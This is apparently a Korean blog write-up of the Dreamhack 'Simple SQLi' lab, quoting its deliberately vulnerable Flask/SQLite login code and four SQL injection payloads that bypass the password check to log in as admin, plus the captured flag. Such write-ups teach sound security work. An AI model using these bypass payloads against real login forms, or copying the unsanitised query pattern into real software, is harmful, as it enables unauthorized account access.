---
title: Dreamhack Exercise SQL Injection
date: 2022-02-21 15:03:51
tags: Dreamhack
categories: Dreamhack
---

## 문제 목표 및 기능 요약
Simple - SQLi 문제의 목표는 관리자 계정으로 로그인하면 출력되는 flag 를 획득하는 것 입니다
사이트에 접속해보면 간단히 로그인 기능만을 제공하고 있음을 확인할 수 있습니다

- /login : 입력받은 ID / PW 를 데이터베이스에서 조회하고 이에 해당하는 데이터가 있는 경우 로그인을 수행합니다

## 웹 서비스 분석

### 데이터 베이스 구조
구성된 데이터베이스는 Figure1 을 통해 database.db 파일로 관리하고 있습니다

Figure1 데이터베이스 구성 코드

```SQL
DATABASE = "database.db" # 데이터베이스 파일명을 database.db로 설정
if os.path.exists(DATABASE) == False: # 데이터베이스 파일이 존재하지 않는 경우,
    db = sqlite3.connect(DATABASE) # 데이터베이스 파일 생성 및 연결
    db.execute('create table users(userid char(100), userpassword char(100));') # users 테이블 생성
    # users 테이블에 관리자와 guest 계정 생성
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit() # 쿼리 실행 확정
    db.close() # DB 연결 종료
```

### 데이터베이스 구조
위의 코드로 생성된 데이터 베이스 구조는 아래와 같습니다

userid 와 userpassword 컬럼은 각각 이용자의 ID 와 PW 를 저장합니다
Figure1 을 살펴보면 guest 계정은 이용자가 알 수 있지만 admin 계정은 랜덤하게 생성된 16 바이트의 문자열이기 때문에 비밀번호를 예상할 수 없습니다

- userid : guest admin
- userpassword : guest 랜덤 16 바이트 문자열을 Hex 형태로 표현 ( 32 바이트 )

### 엔드 포인트 : /login
Figure2 는 로그인 페이지를 구성하는 코드입니다
코드를 살펴보면 메소드에 따른 요청마다 다른 기능을 수행하는 것을 알 수 있습니다

Figure2 login 페이지 코드

```python
@app.route('/login', methods=['GET', 'POST']) # Login 기능에 대해 GET과 POST HTTP 요청을 받아 처리함
def login(): # login 함수 선언
    if request.method == 'GET': # 이용자가 GET 메소드의 요청을 전달한 경우,
        return render_template('login.html') # 이용자에게 ID/PW를 요청받는 화면을 출력
    else: # POST 요청을 전달한 경우
        userid = request.form.get('userid') # 이용자의 입력값인 userid를 받은 뒤,
        userpassword = request.form.get('userpassword') # 이용자의 입력값인 userpassword를 받고
        # users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러옴
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res: # 쿼리 결과가 존재하는 경우
            userid = res[0] # 로그인할 계정을 해당 쿼리 결과의 결과에서 불러와 사용
            if userid == 'admin': # 이 때, 로그인 계정이 관리자 계정인 경우
                return f'hello {userid} flag is {FLAG}' # flag를 출력
            # 관리자 계정이 아닌 경우, 웰컴 메시지만 출력
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        # 일치하는 회원 정보가 없는 경우 로그인 실패 메시지 출력
        return '<script>alert("wrong");history.go(-1);</script>'
```

### GET
![SQL](https://kr.object.ncloudstorage.com/dreamhack-content/page/b9a557263288b06270edbdcc09b97e5512024f104ac7b23b8b82b8c393d13c67.png)

userid 와 userpassword 를 입력할 수 있는 로그인 페이지를 제공합니다
userid 와 password 입력창에 guest 를 입력하면 로그인을 수행할 수 있습니다

### POST
이용자가 입력한 계정 정보가 데이터베이스에 존재하는지 확인합니다
이때 로그인 계정이 admin 일 경우 FLAG 를 출력합니다

## 취약점 분석
Simple - SQLi 문제를 풀이하는 접근 방법은 다양합니다
관리자 계정의 비밀번호를 모른채로 로그인을 우회하여 풀이하는 방법과 관리자 계정의 비밀번호를 알아내고 올바른 경로로 로그인 하는 방법으로 크게 두 가지로 나눌 수 있습니다

이번 코스에서는 로그인을 우회하여 풀이하는 방법으로 문제 풀이를 진행하며 다음 코스에서는 관리자 계정의 비밀번호를 알아내는 풀이에 대해서 배워보도록 하겠습니다

Figure3 을 살펴보면 userid 와 userpassword 를 이용자에게 입력받고 동적으로 쿼리문을 생성한 뒤 query_db 함수에서 SQLite 에 질의합니다

이렇게 동적으로 생성한 쿼리를 RawQuery 라고 합니다
RawQuery 를 생성할 때 이용자의 입력값이 쿼리문에 포함되면 SQL Injection 취약점에 노출될 수 있습니다

이용자의 입력값을 검사하는 과정이 없기 때문에 임의의 쿼리문을 userid 또는 userpassword 에 삽입해 SQL Injection 공격을 수행할 수 있습니다

Figure3 login 과 query_db 함수

```python
def login(): # login 함수 선언
    ...
    userid = request.form.get('userid') # 이용자의 입력값인 userid를 받은 뒤,
    userpassword = request.form.get('userpassword') # 이용자의 입력값인 userpassword를 받고
    # users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러옴
    res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
    ...
    
def query_db(query, one=True): # query_db 함수 선언
    cur = get_db().execute(query) # 연결된 데이터베이스에 쿼리문을 질의
    rv = cur.fetchall() # 쿼리문 내용을 받아오기
    cur.close() # 데이터베이스 연결 종료
    return (rv[0] if rv else None) if one else rv # 쿼리문 질의 내용에 대한 결과를 반환
```

## 익스플로잇
본 문제를 해결하기 위해서는 userid 가 admin 인 계정으로 로그인해야 합니다
Figure4 는 로그인을 위해 실행하는 쿼리문으로 이를 참고해 admin 이라는 결과가 반환되도록 쿼리문을 조작해야 합니다

Figure5 는 admin 계정으로 로그인할 수 있는 SQL Injection 공격 코드입니다
SQL 은 수많은 조건절을 제공하기 때문에 이를 통해 다양한 방법으로 공격을 시도할 수 있습니다

Figure4 로그인 쿼리

```SQL
SELECT * FROM users WHERE userid="{userid}" AND userpassword="{userpassword}";
```

Figure5 SQL Injection 공격 쿼리문 작성

```SQL
/*
ID: admin, PW: DUMMY
userid 검색 조건만을 처리하도록, 뒤의 내용은 주석처리하는 방식
*/
SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"
/*
ID: admin" or "1 , PW: DUMMY
userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식
*/
SELECT * FROM users WHERE userid="admin" or "1" AND userpassword="DUMMY"
/*
ID: admin, PW: DUMMY" or userid="admin
userid 검색 조건에 admin을 입력하고, userpassword 조건에 임의 값을 입력한 뒤 or 조건을 추가하여 userid가 admin인 것을 반환하도록 하는 방식
*/
SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"
/*
ID: " or 1 LIMIT 1,1-- , PW: DUMMY
userid 검색 조건 뒤에 or 1을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT 절을 이용해 두 번째 Row인 admin을 반환토록 하는 방식
*/
SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"
```

## 관리자 계정 로그인
앞서 작성한 공격 쿼리문을 userid 와 userpassword 입력창에 입력하면 admin 계정으로 로그인 되는 것을 확인할 수 있으며 FLAG 를 획득할 수 있습니다

Figure5 공격 쿼리문을 입력해 관리자 계정으로 로그인 한 모습

![SQL](https://kr.object.ncloudstorage.com/dreamhack-content/page/684d7e43118f3195d2831073b5b4b99d5e0e7e5f815ca2e8835b8c0b346d8c5a.png)

Figure6 플래그 획득

![SQL](https://kr.object.ncloudstorage.com/dreamhack-content/page/16975b51fa0c2aa29520ab09601e53f05e4853e9fac81d76839c42a5e8ae9ea1.png)

> Flag : DH{1f136225e316add7bff3349ab1dd5400}

* * * 

## Reference
Reference : https://dreamhack.io